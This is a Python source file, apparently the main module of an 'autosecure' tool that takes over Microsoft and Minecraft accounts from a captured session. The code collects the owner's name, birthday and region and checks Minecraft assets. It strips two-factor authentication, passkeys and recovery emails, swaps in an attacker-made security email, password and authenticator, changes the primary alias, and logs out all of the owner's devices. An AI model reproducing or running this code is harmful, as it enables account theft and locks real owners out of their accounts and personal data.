from securing.utils.security_information import securityInformation
from securing.utils.change_primary_alias import changePrimaryAlias
from securing.utils.add_authenticator import addAuthenticator
from securing.utils.get_recovery_code import getRecoveryCode
from securing.utils.remove_services import removeServices
from securing.utils.generate_email import generateEmail
from securing.utils.get_owner_info import getOwnerInfo
from securing.utils.remove_proof import removeProof
from securing.utils.remove_zyger import removeZyger
from securing.utils.get_cookies import getCookies
from securing.utils.get_profile import getProfile
from securing.utils.remove_2fa import remove2FA
from securing.utils.logout_all import logoutAll
from securing.utils.recovery import recover
from securing.utils.get_amrp import getAMRP
from securing.utils.get_ssid import getSSID
from securing.utils.get_amc import getAMC
from securing.utils.get_t import getT

from minecraft.get_namechange import getUsernameInfo
from minecraft.get_method import getMethod
from minecraft.get_capes import getCapes
from minecraft.get_xbl import getXBL

from database.database import DBConnection
import httpx
import uuid
import json

config = json.load(open("config.json", "r+"))["autosecure"]
replace_alias = config["replace_main_alias"]
enable_2fa = config["enable_2fa"]

database = DBConnection()

async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
    # Main file where all processes to securing the account occur
    
    apicanary = await getCookies(session) 
    
    T = await getT(session)
    print("[+] - Found T")

    verificationToken = await getAMC(session)
    ownerInfo = await getOwnerInfo(session, verificationToken)

    if ownerInfo:
        print("[+] - Got Owner Info")
        
        accountInfo["microsoft"]["firstName"] = ownerInfo["Fname"]
        accountInfo["microsoft"]["lastName"] = ownerInfo["Lname"]
        accountInfo["microsoft"]["region"] = ownerInfo["region"]
        accountInfo["microsoft"]["birthday"] = ownerInfo["birthday"]
        accountInfo["microsoft"]["fullName"] = f"{ownerInfo['Fname']} {ownerInfo['Lname']}"
    
    # Minecraft checking
    print("[~] - Checking Minecraft Account")
    XBLResponse = await getXBL(session)

    if XBLResponse:
        print("[+] - Got XBL (Has Xbox Profile)")

        # XBL && Token
        xbl = XBLResponse["xbl"]

        ssid = await getSSID(xbl)
        
        # Get capes, profile and purchase method
        if ssid:    
            print("[+] - Got SSID! (Has Minecraft)")

            capes = await getCapes(ssid)
            if capes:
                accountInfo["minecraft"]["capes"] = ", ".join(i["alias"] for i in capes)
                print(f"[+] - Got capes")
            else:
                accountInfo["minecraft"]["capes"] = "No capes"

            # Gets account name
            profile = await getProfile(ssid)
            if not profile:
                print("[x] - Failed to get profile (No Minecraft Java)")
            else:
                print(f"[+] - Got profile (Has Minecraft Java)")
                accountInfo["minecraft"]["SSID"] = ssid
                accountInfo["minecraft"]["name"] = profile
                
                usernameInfo = await getUsernameInfo(ssid)
                if not usernameInfo:
                    accountInfo["minecraft"]["uchange"] = "Yes"
                else:
                    accountInfo["minecraft"]["uchange"] = f"Changeable in {usernameInfo} days"

            method = await getMethod(ssid)
            if method:
                accountInfo["minecraft"]["method"] = method
                print(f"[+] - Got purchase method")
        else:
            print("[x] - Failed to get SSID")

    else:
        print("[x] - Failed to get XBL (Account has no Xbox Profile)")
        accountInfo["minecraft"]["name"] = "No Minecraft"

    # Security Steps
    await getAMRP(session, T)
    print("[+] - Got AMRP")

    # 2FA
    await remove2FA(session, apicanary)

    # Pass Keys / Windows Hello Exploit
    await removeZyger(session, apicanary)

    # Removes security_emails / Auth Apps
    await removeProof(session, apicanary)
    print("[+] - Removed all Proofs")
    
    # Third Party Launchers (Minecraft, Prism)
    await removeServices(session)

    if recovery:

        securityParameters = json.loads(await securityInformation(session))
        print("[+] - Got Security Parameters")

        if securityParameters:

            # Original Email
            mainEmail = securityParameters["email"]
            encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"] 

            recovery_code = await getRecoveryCode(
                session,
                apicanary,
                encryptedNetID
            )
            print(f"[+] - Got Recovery Code | {recovery_code}")

            security_email = uuid.uuid4().hex[:16]
            password = uuid.uuid4().hex[:12]

            type, security_email = await generateEmail(security_email, password)

            print(f"[+] - Generated Security Email ({security_email})")
            database.addSecurityEmail(security_email, password)

            print("[~] - Automaticly Securing Account...")
            data = await recover(session, mainEmail, recovery_code, security_email, password, type)

            if data and data != "invalid":
                accountInfo["microsoft"]["security_email"] = security_email
                accountInfo["microsoft"]["recovery_code"] = data["recovery_code"]
                accountInfo["microsoft"]["password"] = password
            else:
                print(f"[X] - Failed to secure this account")
    
    # Add Authenticator
    if enable_2fa:
        auth = await addAuthenticator(session)
        accountInfo["microsoft"]["auth_secret"] = auth
        print(f"[+] - Added Authenticator ({auth})")
        
    # Change Primary Alias is broken
    if replace_alias:

        primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
        print(f"[+] - Generated Primary Email ({primaryEmail}@outlook.com)")
        info = await changePrimaryAlias(session, primaryEmail, apicanary)
        if info:
            accountInfo["microsoft"]["email"] = f"{primaryEmail}@outlook.com"
            print(f"[+] - Changed Primary Alias")
        else:
            accountInfo["microsoft"]["email"] = mainEmail
    else:
        accountInfo["microsoft"]["email"] = mainEmail
        
    # Logout all devices
    await logoutAll(session, apicanary)
    print("[+] - Account has been secured")

    return accountInfo